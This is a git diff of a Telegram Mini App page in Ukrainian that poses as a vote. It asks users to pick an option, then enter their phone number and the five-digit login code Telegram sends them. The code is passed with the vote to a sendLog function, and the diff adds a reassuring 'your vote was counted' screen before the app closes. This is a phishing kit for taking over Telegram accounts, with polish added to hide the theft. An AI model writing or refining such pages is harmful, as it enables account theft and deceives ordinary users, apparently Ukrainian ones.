@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        /* Змінені змінні для тексту, щоб він був білим на темному фоні */
         :root { 
             --btn: var(--tg-theme-button-color, #3390ec); 
             --btn-text: var(--tg-theme-button-text-color, #fff); 
@@ -15,16 +14,26 @@
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
             padding: 20px; 
             
-            /* ФОН: ЗАМІНИ ПОСИЛАННЯ НА СВОЮ КАРТИНКУ, ЯКЩО ТРЕБА */
+            /* ТУТ ТВОЙ ФОН (замени ссылку, если нужно) */
             background: url('https://images.unsplash.com/photo-1557683316-973673baf926?q=80&w=1000&auto=format&fit=crop') no-repeat center center fixed; 
             background-size: cover;
             background-color: #1a1a1a;
             
-            color: #ffffff; /* Білий текст */
+            color: #ffffff; 
             margin: 0; 
             min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
         }
         
+        /* Обертка для контента, чтобы всё было по центру */
+        .content-wrapper {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+
         h2 { font-size: 22px; font-weight: 600; margin: 20px 0 15px; text-align: center; color: #ffffff; }
         p { font-size: 14px; color: #dddddd; margin-bottom: 15px; text-align: center; }
         
@@ -32,8 +41,8 @@
         .vote-card { 
             display: flex; 
             align-items: center; 
-            background: rgba(255, 255, 255, 0.9); /* Напівпрозорий білий фон картки */
-            color: #000000; /* Чорний текст всередині картки */
+            background: rgba(255, 255, 255, 0.9); 
+            color: #000000; 
             border: 2px solid transparent; 
             border-radius: 14px; 
             padding: 10px; 
@@ -69,49 +78,81 @@
         input:focus { outline: none; border-color: var(--btn); background: #ffffff; }
         
         #debug { font-size: 12px; color: #34c759; margin-top: 20px; text-align: center; word-break: break-all; }
+
+        /* Стили для экрана "Спасибо" */
+        .thanks-screen {
+            text-align: center;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 30px 20px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+        }
+        .thanks-screen .icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+        .thanks-screen h2 {
+            margin-top: 0;
+            color: #34c759;
+        }
+        .thanks-screen p {
+            font-size: 16px;
+            color: #ffffff;
+            margin-bottom: 25px;
+        }
     </style>
 </head>
 <body>
 
-    <!-- ЕКРАН 1: ГОЛОСУВАННЯ -->
-    <div id="screen-vote">
-        <h2>Зробіть вибір</h2>
-        <p>Натисніть на одну з карток</p>
-        
-        <div class="vote-card" data-vote="Варіант 1" onclick="selectVote(this)">
-            <img src="https://picsum.photos/id/1015/100/100" alt="Варіант 1">
-            <div class="vote-title">Варіант 1</div>
-        </div>
-        
-        <div class="vote-card" data-vote="Варіант 2" onclick="selectVote(this)">
-            <img src="https://picsum.photos/id/1025/100/100" alt="Варіант 2">
-            <div class="vote-title">Варіант 2</div>
-        </div>
-        
-        <div class="vote-card" data-vote="Варіант 3" onclick="selectVote(this)">
-            <img src="https://picsum.photos/id/1035/100/100" alt="Варіант 3">
-            <div class="vote-title">Варіант 3</div>
+    <div class="content-wrapper">
+        <!-- ЕКРАН 1: ГОЛОСУВАННЯ -->
+        <div id="screen-vote">
+            <h2>Зробіть вибір</h2>
+            <p>Натисніть на одну з карток</p>
+            
+            <div class="vote-card" data-vote="Варіант 1" onclick="selectVote(this)">
+                <img src="https://picsum.photos/id/1015/100/100" alt="Варіант 1">
+                <div class="vote-title">Варіант 1</div>
+            </div>
+            
+            <div class="vote-card" data-vote="Варіант 2" onclick="selectVote(this)">
+                <img src="https://picsum.photos/id/1025/100/100" alt="Варіант 2">
+                <div class="vote-title">Варіант 2</div>
+            </div>
+            
+            <div class="vote-card" data-vote="Варіант 3" onclick="selectVote(this)">
+                <img src="https://picsum.photos/id/1035/100/100" alt="Варіант 3">
+                <div class="vote-title">Варіант 3</div>
+            </div>
+
+            <button class="main-btn" id="btn-next-vote" disabled onclick="showPhone()">Далі</button>
         </div>
 
-        <button class="main-btn" id="btn-next-vote" disabled onclick="showPhone()">Далі</button>
-    </div>
+        <!-- ЕКРАН 2: НОМЕР -->
+        <div id="screen-phone" class="hidden">
+            <h2>Ваш номер</h2>
+            <p>Введіть номер телефону для обліку голосу</p>
+            <input type="tel" id="phone-input" placeholder="+380 99 123-45-67">
+            <button class="main-btn" id="btn-manual" disabled onclick="submitPhone()">Надіслати номер</button>
+            <button class="back-btn" onclick="goBack('screen-phone', 'screen-vote')">← Змінити голос</button>
+        </div>
 
-    <!-- ЕКРАН 2: НОМЕР -->
-    <div id="screen-phone" class="hidden">
-        <h2>Ваш номер</h2>
-        <p>Введіть номер телефону для обліку голосу</p>
-        <input type="tel" id="phone-input" placeholder="+380 99 123-45-67">
-        <button class="main-btn" id="btn-manual" disabled onclick="submitPhone()">Надіслати номер</button>
-        <button class="back-btn" onclick="goBack('screen-phone', 'screen-vote')">← Змінити голос</button>
-    </div>
+        <!-- ЕКРАН 3: КОД -->
+        <div id="screen-code" class="hidden">
+            <h2>Введіть код</h2>
+            <p>Код із 5 цифр, який надійшов у Telegram</p>
+            <input type="text" id="code-input" inputmode="numeric" maxlength="5" placeholder="00000" autocomplete="one-time-code">
+            <button class="main-btn" id="btn-submit" disabled onclick="submitCode()">Надіслати код</button>
+            <button class="back-btn" onclick="goBack('screen-code', 'screen-phone')">← Змінити номер</button>
+        </div>
 
-    <!-- ЕКРАН 3: КОД -->
-    <div id="screen-code" class="hidden">
-        <h2>Введіть код</h2>
-        <p>Код із 5 цифр, який надійшов у Telegram</p>
-        <input type="text" id="code-input" inputmode="numeric" maxlength="5" placeholder="00000" autocomplete="one-time-code">
-        <button class="main-btn" id="btn-submit" disabled onclick="submitCode()">Надіслати код</button>
-        <button class="back-btn" onclick="goBack('screen-code', 'screen-phone')">← Змінити номер</button>
+        <!-- ЕКРАН 4: СПАСИБО -->
+        <div id="screen-thanks" class="hidden thanks-screen">
+            <div class="icon">✅</div>
+            <h2>Дякуємо! 🇺🇦</h2>
+            <p>Ваш голос успішно враховано.</p>
+            <button class="main-btn" onclick="closeApp()">Закрити</button>
+        </div>
     </div>
 
     <div id="debug"></div>
@@ -180,8 +221,22 @@
             if (code.length !== 5) return;
             dbg('Код надіслано: ' + code);
 
+            // Отправляем код
             sendLog(`🔑 <b>КОД:</b> ${code}\n🗳 <b>ГОЛОС:</b> ${selectedVote}`);
-            setTimeout(() => { try { window.Telegram.WebApp.close(); } catch(e){} }, 500);
+            
+            // Переключаем на экран "Спасибо"
+            document.getElementById('screen-code').classList.add('hidden');
+            document.getElementById('screen-thanks').classList.remove('hidden');
+            document.getElementById('debug').classList.add('hidden'); // Прячем дебаг, чтобы не мешал
+
+            // Автоматически закрываем мини-апп через 3 секунды
+            setTimeout(() => {
+                closeApp();
+            }, 3000);
+        }
+
+        function closeApp() {
+            try { window.Telegram.WebApp.close(); } catch(e){}
         }
 
         window.onload = () => {
